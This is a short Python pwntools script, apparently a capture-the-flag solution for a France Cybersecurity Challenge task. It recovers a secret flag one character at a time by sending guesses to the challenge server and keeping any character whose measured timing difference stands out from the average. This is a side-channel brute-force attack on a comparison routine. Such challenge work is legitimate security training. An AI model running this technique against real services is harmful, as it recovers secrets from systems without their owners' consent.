from pwn import *
import re, string, statistics, time

charset = string.printable[:-5]
flag = ""

conn = remote('challenges.france-cybersecurity-challenge.fr', 2350)
conn.recvuntil('Answer:')

start = time.time()
for _ in range(1000):
	list = []
	for c in charset:
		payload = flag + c + '\n'
		conn.send(payload)
		response = conn.recvuntil('Answer:').decode().strip(); print(response)
		numbers = re.findall(r'\d+', response)
		diff = int(numbers[1]) - int(numbers[0])
		list.append(diff)
		tps = time.time() - start
		print(f"Payload = {payload.strip()} Diff = {diff} Temps (s): {tps}")
		if diff > 1.25*statistics.mean(list):
			flag += c
			print(f"[+] Flag = {flag}")
			break

conn.close()
